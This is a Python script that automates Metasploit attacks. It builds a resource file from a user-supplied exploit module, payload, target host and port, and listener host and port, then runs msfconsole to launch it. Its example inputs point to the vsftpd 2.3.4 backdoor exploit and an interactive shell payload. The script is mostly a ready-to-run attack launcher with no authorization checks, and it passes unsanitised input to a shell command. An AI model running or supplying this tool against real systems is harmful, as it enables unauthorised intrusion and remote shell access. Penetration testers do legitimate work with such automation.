import os
import subprocess
import logging
from logging_setup import setup_logging

# Set up logging
logger = setup_logging()

def create_resource_file(module, payload, rhost, rport, lhost, lport):
    """
    Create a Metasploit resource file to automate the exploitation process.
    """
    resource_file = "exploit.rc"
    with open(resource_file, "w") as f:
        f.write(f"use {module}\n")
        f.write(f"set PAYLOAD {payload}\n")
        f.write(f"set RHOST {rhost}\n")
        f.write(f"set RPORT {rport}\n")
        f.write(f"set LHOST {lhost}\n")
        f.write(f"set LPORT {lport}\n")
        f.write("exploit\n")
    logger.info(f"Resource file {resource_file} created.")
    return resource_file

def run_exploit(module, payload, rhost, rport, lhost, lport):
    """
    Automates the Metasploit exploitation process using the specified module and payload.
    """
    try:
        # Create a resource file with the specified parameters
        resource_file = create_resource_file(module, payload, rhost, rport, lhost, lport)

        # Run the resource file with msfconsole
        command = f"msfconsole -r {resource_file} -q"
        logger.info(f"Running Metasploit exploit: {command}")
        result = subprocess.run(command, shell=True, capture_output=True, text=True)

        if result.returncode == 0:
            logger.info("Exploit executed successfully.")
            return result.stdout
        else:
            logger.error(f"Exploit failed: {result.stderr}")
            return None
    except Exception as e:
        logger.error(f"Error during exploit: {str(e)}")
        return None
    finally:
        # Clean up the resource file after execution
        if os.path.exists(resource_file):
            os.remove(resource_file)
            logger.info(f"Resource file {resource_file} deleted.")

if __name__ == "__main__":
    # Example usage of the exploit module
    module = input("Enter the exploit module (e.g., exploit/unix/ftp/vsftpd_234_backdoor): ")
    payload = input("Enter the payload (e.g., cmd/unix/interact): ")
    rhost = input("Enter the target IP address: ")
    rport = input("Enter the target port (e.g., 21): ")
    lhost = input("Enter your local IP address: ")
    lport = input("Enter your local port (e.g., 4444): ")

    run_exploit(module, payload, rhost, rport, lhost, lport)
